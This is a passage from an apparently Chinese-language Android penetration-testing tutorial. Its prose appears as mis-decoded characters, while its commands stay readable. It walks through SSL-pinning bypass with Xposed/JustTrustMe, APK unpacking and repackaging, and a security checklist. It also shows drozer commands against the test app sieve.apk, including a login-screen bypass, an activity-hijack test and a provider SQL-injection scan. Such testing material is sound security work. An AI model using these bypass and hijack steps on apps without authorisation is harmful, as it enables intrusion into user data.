title="SSL-Pinningç»•è¿‡â€“æœ‰é—®é¢˜"></a>SSL-Pinningç»•è¿‡â€“æœ‰é—®é¢˜</h3><blockquote><p>SSL-pinningæœ‰ä¸¤ç§æ–¹å¼ï¼š è¯ä¹¦é”å®šï¼ˆCertificate Pinningï¼‰ å’Œå…¬é’¥é”å®šï¼ˆ Public Key Pinningï¼‰ã€‚</p><ul><li><strong>è¯ä¹¦é”å®š</strong> éœ€è¦åœ¨å®¢æˆ·ç«¯ä»£ç å†…ç½®ä»…æ¥å—æŒ‡å®šåŸŸåçš„è¯ä¹¦ï¼Œè€Œä¸æ¥å—æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨å†…ç½®çš„CAæ ¹è¯ä¹¦å¯¹åº”çš„ä»»ä½•è¯ä¹¦ï¼Œé€šè¿‡è¿™ç§æˆæƒæ–¹å¼ï¼Œä¿éšœäº†APPä¸æœåŠ¡ç«¯é€šä¿¡çš„å”¯ä¸€æ€§å’Œå®‰å…¨æ€§ï¼Œå› æ­¤å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼ˆä¾‹å¦‚APIç½‘å…³ï¼‰ä¹‹é—´çš„é€šä¿¡æ˜¯å¯ä»¥ä¿è¯ç»å¯¹å®‰å…¨ã€‚ä½†æ˜¯CAç­¾å‘è¯ä¹¦éƒ½å­˜åœ¨æœ‰æ•ˆæœŸé—®é¢˜ï¼Œç¼ºç‚¹æ˜¯åœ¨ è¯ä¹¦ç»­æœŸåéœ€è¦å°†è¯ä¹¦é‡æ–°å†…ç½®åˆ°APPä¸­ã€‚</li><li><strong>å…¬é’¥é”å®š</strong> æå–è¯ä¹¦ä¸­çš„å…¬é’¥å¹¶å†…ç½®åˆ°å®¢æˆ·ç«¯ä¸­ï¼Œé€šè¿‡ä¸æœåŠ¡å™¨å¯¹æ¯”å…¬é’¥å€¼æ¥éªŒè¯è¿æ¥çš„æ­£ç¡®æ€§ã€‚åˆ¶ä½œè¯ä¹¦å¯†é’¥æ—¶ï¼Œå…¬é’¥åœ¨è¯ä¹¦çš„ç»­æœŸå‰åéƒ½å¯ä»¥ä¿æŒä¸å˜ï¼ˆå³å¯†é’¥å¯¹ä¸å˜ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é¿å…è¯ä¹¦æœ‰æ•ˆæœŸé—®é¢˜ï¼Œä¸€èˆ¬æ¨èè¿™ç§åšæ³•ã€‚</li></ul></blockquote><p>ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨<strong>xposedæ¡†æ¶ä¸­çš„JustTrustMe</strong></p><blockquote><p>Xposedæ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œå®ƒå¯ä»¥æ”¹å˜ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„è¡Œä¸ºï¼Œè€Œä¸æ¥è§¦ä»»ä½•APKã€‚å®ƒæ”¯æŒå¾ˆå¤šæ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—å¯ä»¥ç”¨æ¥å¸®åŠ©å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚JustTrustMe æ˜¯ä¸€ä¸ªç”¨æ¥ç¦ç”¨ã€ç»•è¿‡ SSL è¯ä¹¦æ£€æŸ¥çš„åŸºäº Xposed æ¨¡å—ã€‚JustTrustMe æ˜¯å°† APK ä¸­æ‰€æœ‰ç”¨äºæ ¡éªŒ SSL è¯ä¹¦çš„ API éƒ½è¿›è¡Œäº† Hookï¼Œä»è€Œç»•è¿‡è¯ä¹¦æ£€æŸ¥ã€‚</p></blockquote><p><strong>é‡åˆ°çš„é—®é¢˜</strong></p><p>ç”¨Xposed+JustTrustMe appèƒ½æŠ“åˆ°appçš„æ•°æ®åŒ…ï¼Œä½†æ˜¯å†…ç½®ç½‘é¡µéƒ½è®¿é—®ä¸åˆ°äº†</p><h2 id="r0captureâ€“å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬"><a href="#r0captureâ€“å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬" class="headerlink" title="r0captureâ€“å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬"></a>r0captureâ€“å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬</h2><p><a href="https://github.com/r0ysue/r0capture">r0capture</a></p><h1 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h1><p>æŸ¥å£³</p><ul><li><a href="https://github.com/MagiCiAn1/APKProtectionSearch">MagiCiAn1&#x2F;APKProtectionSearch: apkæŸ¥å£³å·¥å…· (github.com)</a></li><li><a href="https://github.com/dstmath/frida-unpack">dstmath&#x2F;frida-unpack: åŸºäºFridaçš„è„±å£³å·¥å…· (github.com)</a></li><li><a href="https://blog.csdn.net/cui_yonghua/article/details/126693444">è„±å£³å·¥å…·ï¼šåå°„å¤§å¸ˆçš„ä½¿ç”¨è¯¦è§£-CSDNåšå®¢</a></li></ul><p>è„±å£³</p><ul><li><p><a href="https://github.com/CodingGay/BlackDex">CodingGay&#x2F;BlackDex: BlackDex is an Android unpack(dexdump) tool, it supports Android 5.0~12 and need not rely to any environment. BlackDex can run on any Android mobile phone or emulator, you can unpack APK File in several seconds. (github.com)</a></p></li><li></li></ul><h1 id="æµ‹è¯•checklist"><a href="#æµ‹è¯•checklist" class="headerlink" title="æµ‹è¯•checklist"></a>æµ‹è¯•checklist</h1><p><img src="/../images/905443_6J7WGQ2HGW4RUP4.png" alt="905443_6J7WGQ2HGW4RUP4"></p><h2 id="å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨"><a href="#å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨" class="headerlink" title="å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨"></a>å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨</h2><h3 id="å®‰è£…åŒ…ç­¾åæ ¡éªŒ"><a href="#å®‰è£…åŒ…ç­¾åæ ¡éªŒ" class="headerlink" title="å®‰è£…åŒ…ç­¾åæ ¡éªŒ"></a>å®‰è£…åŒ…ç­¾åæ ¡éªŒ</h3><blockquote><p>å¦‚æœ APK æ²¡æœ‰ ä½¿ç”¨è‡ªå·±çš„è¯ä¹¦è¿›è¡Œç­¾åï¼Œå°†ä¼šå¤±å»å¯¹ç‰ˆæœ¬ç®¡ç†çš„ä¸»åŠ¨æƒã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jarsigner -verify -certs -verbose apk</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230904114950022.png?lastModify=1695029992" alt="image-20230904114950022"></p><p>jadx-gui</p><p><img src="/../images/image-20230904115047184.png?lastModify=1695029992" alt="image-20230904115047184"></p><h3 id="åç¼–è¯‘ä¿æŠ¤"><a href="#åç¼–è¯‘ä¿æŠ¤" class="headerlink" title="åç¼–è¯‘ä¿æŠ¤"></a>åç¼–è¯‘ä¿æŠ¤</h3><blockquote><p>æ²¡æœ‰åç¼–è¯‘ä¿æŠ¤ï¼Œå¯èƒ½è¢«æ¶æ„äººå‘˜è¿›è¡Œé€†å‘ç ´è§£ç­‰æ“ä½œã€‚</p></blockquote><p>ç›´æ¥ä½¿ç”¨jadx-guiæ‰“å¼€å³å¯ï¼Œå¦‚æœæ··æ·†åçš„ä»£ç æ ·ä¾‹ï¼Œé™¤äº†è¦†å†™å’Œæ¥å£ä»¥å¤–çš„å­—æ®µéƒ½æ˜¯æ— æ„ä¹‰çš„åç§°ï¼Œåˆ™è¯´æ˜æ˜¯å®‰å…¨çš„ï¼Œå¦‚ä¸‹å³ä¸ºå®‰å…¨çš„ã€‚</p><p><img src="/../images/image-20230927104447402.png" alt="image-20230927104447402"></p><h3 id="åº”ç”¨å®Œæ•´æ€§æ ¡æ£€"><a href="#åº”ç”¨å®Œæ•´æ€§æ ¡æ£€" class="headerlink" title="åº”ç”¨å®Œæ•´æ€§æ ¡æ£€"></a>åº”ç”¨å®Œæ•´æ€§æ ¡æ£€</h3><blockquote><p>æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åç¼–è¯‘çš„æ–¹æ³•åœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­æ¤å…¥è‡ªå·±çš„æœ¨é©¬ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¦‚æœæ²¡æœ‰è‡ªæ ¡éªŒæœºåˆ¶çš„è¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç¯¡æ”¹å®¢æˆ·ç«¯ç¨‹åºçªƒå–æ‰‹æœºç”¨æˆ·çš„éšç§ä¿¡æ¯ã€‚</p></blockquote><p><strong>è§£åŒ…</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d -f APK -o DIR</span><br></pre></td></tr></table></figure><p><strong>ä¿®æ”¹èµ„æºæ–‡ä»¶</strong></p><p>æ”¹ä¸€äº›å®¹æ˜“åˆ†è¾¨çš„ï¼Œæ¯”å¦‚logo</p><p><code>assets/pmbwe64/css/banklogo/logo</code></p><p><img src="/../images/image-20230927110713736.png" alt="image-20230927110713736"></p><p><strong>æ‰“åŒ…</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar b -f DIR -o new.apk</span><br></pre></td></tr></table></figure><p><strong>å¯¹ç”Ÿæˆçš„APKè¿›è¡Œç­¾å</strong></p><blockquote><p>APK å¿…é¡»è¿›è¡Œç­¾ååï¼Œæ–¹å¯å®‰è£…å’Œè¿è¡Œã€‚å¦‚æœå¼€å¯äº†â€œå…è®¸æœªçŸ¥æ¥æºçš„åº” ç”¨â€ï¼Œé‚£ä¹ˆ Debug è¯ä¹¦ã€è‡ªç­¾åè¯ä¹¦ã€è¿‡æœŸè¯ä¹¦çš„ç­¾åéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¸å¯ä»¥ä¸ç­¾ åã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar signapk.jar testkey.x509.pem testkey.pk8 å¾…ç­¾åAPK è¾“å‡ºAPK</span><br></pre></td></tr></table></figure><p><strong>é‡æ–°å®‰è£…å¯åŠ¨ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰è‡ªæ ¡éªŒ</strong></p><h3 id="ä¸æ°å½“çš„é…ç½®"><a href="#ä¸æ°å½“çš„é…ç½®" class="headerlink" title="ä¸æ°å½“çš„é…ç½®"></a>ä¸æ°å½“çš„é…ç½®</h3><ul><li><p>Debugæ¨¡å¼</p><blockquote><p>å®¢æˆ·ç«¯è½¯ä»¶ <code>AndroidManifest.xml</code> ä¸­çš„ <code>android:debuggable=&quot;true&quot;</code>æ ‡è®°å¦‚æœå¼€å¯ï¼Œå¯è¢«Java è°ƒè¯•å·¥å…·ä¾‹å¦‚ jdb è¿›è¡Œè°ƒè¯•ï¼Œè·å–å’Œç¯¡æ”¹ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³åˆ†æå¹¶ä¸”ä¿®æ”¹ä»£ç å®ç°çš„ä¸šåŠ¡é€»è¾‘ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨ android.util.Log æ¥æ‰“å°æ—¥å¿—ï¼Œè½¯ä»¶å‘å¸ƒåè°ƒè¯•æ—¥å¿—è¢«å…¶ä»–å¼€å‘è€…çœ‹åˆ°ï¼Œå®¹æ˜“è¢«åç¼–è¯‘ç ´è§£ã€‚</p></blockquote></li><li><p>åº”ç”¨ç¨‹åºæ•°æ®å¯å¤‡ä»½</p><blockquote><p><code>AndroidMainfest.xml</code> æ–‡ä»¶ä¸­çš„ <code>allowBackup</code> å±æ€§å€¼æ§åˆ¶ï¼Œå…¶é»˜è®¤å€¼ä¸º <code>true</code>ã€‚å½“è¯¥å±æ€§æ²¡æœ‰æ˜¾å¼è®¾ç½®ä¸º <code>false</code> æ—¶,æ”»å‡»è€…å¯é€šè¿‡ <code>adb backup</code> å’Œ <code>adb restore</code> å¯¹ App çš„åº”ç”¨æ•°æ®è¿›è¡Œå¤‡ä»½å’Œæ¢å¤ï¼Œä»è€Œå¯èƒ½è·å–æ˜æ–‡å­˜å‚¨çš„ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚</p></blockquote></li></ul><p>ä½¿ç”¨jadx-guiæ‰“å¼€æœç´¢å³å¯</p><h2 id="æ•æ„Ÿä¿¡æ¯å®‰å…¨æµ‹è¯•"><a href="#æ•æ„Ÿä¿¡æ¯å®‰å…¨æµ‹è¯•" class="headerlink" title="æ•æ„Ÿä¿¡æ¯å®‰å…¨æµ‹è¯•"></a>æ•æ„Ÿä¿¡æ¯å®‰å…¨æµ‹è¯•</h2><ul><li><p>APKåç¼–è¯‘æºç ä¸­æ³„æ¼çš„æ•æ„Ÿä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jadx-guiæœç´¢</span><br><span class="line">æ¼æ‰«å¹³å°</span><br></pre></td></tr></table></figure></li><li><p>ç§æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADBè¿æ¥æŸ¥çœ‹</span><br></pre></td></tr></table></figure></li><li><p>ç§æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯æ³„æ¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADBè¿æ¥æŸ¥æ‰¾</span><br></pre></td></tr></table></figure></li><li><p>æ—¥å¿—æ˜¯å¦æ‰“å°æ•æ„Ÿæ•°æ®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb logcat //æŒç»­è¾“å‡ºæ—¥å¿—ï¼Œç›´åˆ° Ctrl+C </span><br><span class="line">adb logcat -d &gt; log.txt //ä¸€æ¬¡æ€§è¾“å‡ºæ—¥å¿—ç¼“å­˜ï¼Œä¸ä¼šé˜»å¡ </span><br></pre></td></tr></table></figure></li></ul><p>è¡¥å……ï¼š<a href="https://bbs.kanxue.com/thread-271122.htm#msg_header_h3_12">åŸåˆ›]Android APPæ¼æ´ä¹‹æˆ˜ï¼ˆ7ï¼‰â€”â€”ä¿¡æ¯æ³„éœ²æ¼æ´è¯¦è§£-Androidå®‰å…¨-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><h2 id="å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶æµ‹è¯•"><a href="#å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶æµ‹è¯•" class="headerlink" title="å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶æµ‹è¯•"></a>å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶æµ‹è¯•</h2><p>æµ‹è¯•ç”¨APK</p><p><a href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">https://github.com/as0ler/Android-Examples/blob/master/sieve.apk</a></p><p><a href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk">qark&#x2F;tests&#x2F;goatdroid.apk at master Â· linkedin&#x2F;qark (github.com)</a></p><h3 id="drozerå®‰è£…"><a href="#drozerå®‰è£…" class="headerlink" title="drozerå®‰è£…"></a><strong>drozerå®‰è£…</strong></h3><p><strong>PCæ§åˆ¶ç«¯å®‰è£…</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">python2 -m pip install wheel</span><br><span class="line">python2 -m pip install pyyaml</span><br><span class="line">python2 -m pip install pyhamcrest</span><br><span class="line">python2 -m pip install protobuf</span><br><span class="line">python2 -m pip install pyopenssl</span><br><span class="line">python2 -m pip install twisted</span><br><span class="line">python2 -m pip install service_identity</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½whlåˆ°æœ¬åœ°</span></span><br><span class="line">wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl</span><br><span class="line">python2 -m pip install drozer-2.4.4-py2-none-any.whl</span><br></pre></td></tr></table></figure><p><strong>è®¾å¤‡ç«¯agentå®‰è£…</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</span><br><span class="line">adb install drozer-agent-2.3.4.apk</span><br></pre></td></tr></table></figure><p><strong>è¿æ¥</strong></p><p>è®¾å¤‡ç«¯å¼€å¯drozer</p><p><img src="/../images/image-20231012214134944.png" alt="image-20231012214134944"></p><p>pcæ§åˆ¶ç«¯ï¼ˆ<strong>æ³¨æ„åœ¨D:\python2.7\Scriptsä¸‹å¯åŠ¨drozer</strong>ï¼‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç«¯å£è½¬å‘</span></span><br><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸‹å›¾è¡¨ç¤ºè¿æ¥æˆåŠŸ</p><p><img src="/../images/image-20231012214244755.png" alt="image-20231012214244755"></p><p><strong>ä¹±ç è§£å†³</strong></p><p><img src="/../images/image-20231012222013025.png" alt="image-20231012222013025"></p><p><code>D:\python2.7\Lib\site-packages\drozer\modules\app</code>ä¸‹çš„<code>package.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¼€å¤´æ·»åŠ </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 360,362è¡ŒæŒ‡å®šå­—ç¬¦ä¸²ä¸ºunicodeå­—ç¬¦ä¸²ï¼Œå‰ç¼€&quot;u&quot;</span></span><br><span class="line">self.stdout.write(<span class="string">u&quot;%s\n&quot;</span> % application.packageName)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231012222306823.png" alt="image-20231012222306823"></p><h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><ul><li><p><strong>æ ¹æ®åå­—æŸ¥æ‰¾APK</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.package.list -f &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure></li><li><p><strong>è·å¾—APKçš„åŸºæœ¬ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.package.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10046</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure></li><li><p><strong>ä¸€é”®æ£€æµ‹APKå­˜åœ¨çš„æ”»å‡»é¢</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;packagename&gt;</code>æ˜¯åŒ…åã€‚</p></blockquote></li></ul><blockquote><p>å¯ä»¥çœ‹åˆ°æœ‰3ä¸ªactivityã€0ä¸ªå¹¿æ’­æ¥æ”¶è€…ã€2ä¸ªå†…å®¹æä¾›è€…å’Œ2ä¸ªæœåŠ¡å¯ä»¥è¢«å¯¼å‡ºï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼</p></blockquote><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table><thead><tr><th>æ¼æ´ç§ç±»</th><th>å±å®³</th></tr></thead><tbody><tr><td>è¶Šæƒç»•è¿‡</td><td>Activity ç”¨æˆ·ç•Œé¢ç»•è¿‡ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯çªƒå–</td></tr><tr><td>æ‹’ç»æœåŠ¡</td><td>é€šè¿‡ Intent ç»™ Activity ä¼ è¾“ç•¸å½¢æ•°æ®ä½¿å¾—ç¨‹åºå´©æºƒä»è€Œå½±å“ç”¨æˆ·ä½“éªŒ</td></tr><tr><td>Activity åŠ«æŒ</td><td>ç»„ä»¶å¯¼å‡ºå¯¼è‡´é’“é±¼æ¬ºè¯ˆï¼ŒActivity ç•Œé¢è¢«åŠ«æŒäº§ç”Ÿæ¬ºè¯ˆç­‰å®‰å…¨äº‹ä»¶</td></tr><tr><td>éšå¼å¯åŠ¨ intent åŒ…å«æ•æ„Ÿæ•°æ®</td><td>æ•æ„Ÿä¿¡æ¯æ³„éœ²</td></tr></tbody></table><h4 id="è·å–å¯å¯¼å‡ºactivity"><a href="#è·å–å¯å¯¼å‡ºactivity" class="headerlink" title="è·å–å¯å¯¼å‡ºactivity"></a><strong>è·å–å¯å¯¼å‡ºactivity</strong></h4><p>åœ¨ Android ç³»ç»Ÿä¸­ï¼ŒActivity ç»„ä»¶é»˜è®¤æ˜¯ä¸å¯¼å‡ºçš„ï¼Œå¦‚æœ <code>AndroidManifest.xml</code> ä¸­è®¾ç½®äº† <code>exported = &quot;true&quot;</code> è¿™æ ·çš„å…³é”®å€¼æˆ–è€…æ˜¯æ·»åŠ äº†<code>&lt;intent-filter&gt;</code> è¿™æ ·çš„å±æ€§ï¼Œé‚£ä¹ˆæ­¤æ—¶ Activity ç»„ä»¶æ˜¯å¯¼å‡ºçš„ï¼Œå°±ä¼šå¼•å‘è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰çš„å®‰å…¨é£é™©ã€‚</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.my.app.Initial&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>drozerè·å¾—å¯å¯¼å‡ºactivity  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.activity.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure><h4 id="è¶Šæƒç»•è¿‡æµ‹è¯•"><a href="#è¶Šæƒç»•è¿‡æµ‹è¯•" class="headerlink" title="è¶Šæƒç»•è¿‡æµ‹è¯•"></a>è¶Šæƒç»•è¿‡æµ‹è¯•</h4><p>æ­£å¸¸ç¬¬ä¸€æ¬¡æ‰“å¼€æ˜¯è¿™æ ·çš„</p><p><img src="/../images/image-20231012232654681.png" alt="image-20231012232654681"></p><p>å¯¹åº”çš„æ˜¯<code>MainLoginActivity</code>è¿™ä¸ªactivity</p><p><img src="/../images/image-20231012232931968.png" alt="image-20231012232931968"></p><p>è°ƒç”¨<code>PWList</code>è¿™ä¸ªactivityï¼Œå®ç°ç™»å½•ç»•è¿‡ç•Œé¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231012232745487.png" alt="image-20231012232745487"></p><h4 id="ActivityåŠ«æŒ"><a href="#ActivityåŠ«æŒ" class="headerlink" title="ActivityåŠ«æŒ"></a><strong>ActivityåŠ«æŒ</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¯å¢ƒå‡†å¤‡</span></span><br><span class="line">wget https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk</span><br><span class="line"><span class="comment"># å®‰è£…ç‚¹å‡»åŠ«æŒè½¯ä»¶</span></span><br><span class="line">adb install uihijackv2.0_sign.apk</span><br></pre></td></tr></table></figure><p>åŠ«æŒæµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.list -f jack</span><br><span class="line">com.test.uihijack (Hijackæµ‹è¯•)</span><br><span class="line"></span><br><span class="line">dz&gt; run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity</span><br></pre></td></tr></table></figure><p>åœ¨æ‰“å¼€åŸactivityçš„åŸºç¡€ä¸Šï¼Œè°ƒç”¨æ­¤ç»„ä»¶ï¼Œå¦‚æœ<code>uihijackv2.0_sign</code>ç•Œé¢ä½äºè¢«æµ‹è½¯ä»¶ä¸Šï¼Œåˆ™å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨æ¼æ´ã€‚å¦‚ä¸‹å›¾ä¸ºå­˜åœ¨æ¼æ´çš„æƒ…å†µã€‚</p><p><img src="/../images/image-20231012233356456.png" alt="image-20231012233356456"></p><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»"></a>æ‹’ç»æœåŠ¡æ”»å‡»</h4><blockquote><p>è°ƒç”¨ç»„ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦å¯¼è‡´æ‹’ç»æœåŠ¡ï¼Œè‹¥ç¨‹åºå‡ºç° <code>ç¨‹åºå´©æºƒ</code>ã€<code>å·²åœæ­¢è¿è¡Œ</code> ç­‰ç¨‹åºæ— æ³•è¿è¡Œæˆ–è‡ªåŠ¨é€€å‡ºè¡Œä¸ºåˆ™ä¸ºæ”»å‡»æˆåŠŸã€‚</p></blockquote><p><a href="http://rui0.cn/archives/30">http://rui0.cn/archives/30</a></p><h3 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content-Provider"></a>Content-Provider</h3><table><thead><tr><th>æ¼æ´ç§ç±»</th><th>å±å®³</th></tr></thead><tbody><tr><td>ä¿¡æ¯æ³„éœ²</td><td>æŸ¥çœ‹ç»„ä»¶æ•°æ®ä¿¡æ¯</td></tr><tr><td>SQLæ³¨å…¥</td><td>æ³¨å…¥è·å–ç›¸å…³æ•°æ®</td></tr><tr><td>ç›®å½•éå†</td><td>è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶</td></tr></tbody></table><h4 id="æŸ¥çœ‹-provider-æ•°æ®ç»„ä»¶ä¿¡æ¯"><a href="#æŸ¥çœ‹-provider-æ•°æ®ç»„ä»¶ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ provider æ•°æ®ç»„ä»¶ä¿¡æ¯"></a><strong>æŸ¥çœ‹ provider æ•°æ®ç»„ä»¶ä¿¡æ¯</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013104113982.png" alt="image-20231013104113982"></p><h4 id="ä¿¡æ¯æ³„æ¼"><a href="#ä¿¡æ¯æ³„æ¼" class="headerlink" title="ä¿¡æ¯æ³„æ¼"></a><strong>ä¿¡æ¯æ³„æ¼</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013104901284.png" alt="image-20231013104901284"></p><p>å…³æ³¨çº¢æ¡†éƒ¨åˆ†ï¼Œå¯èƒ½å­˜åœ¨æ•°æ®æ³„éœ²ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query &lt;URI&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013105050259.png" alt="image-20231013105050259"></p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><blockquote><p>Androidä½¿ç”¨çš„æ˜¯sqlite</p><p><a href="https://xz.aliyun.com/t/8627">sqliteæ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></blockquote><p>è¿›è¡Œsqlæ³¨å…¥æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;package&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013105351961.png" 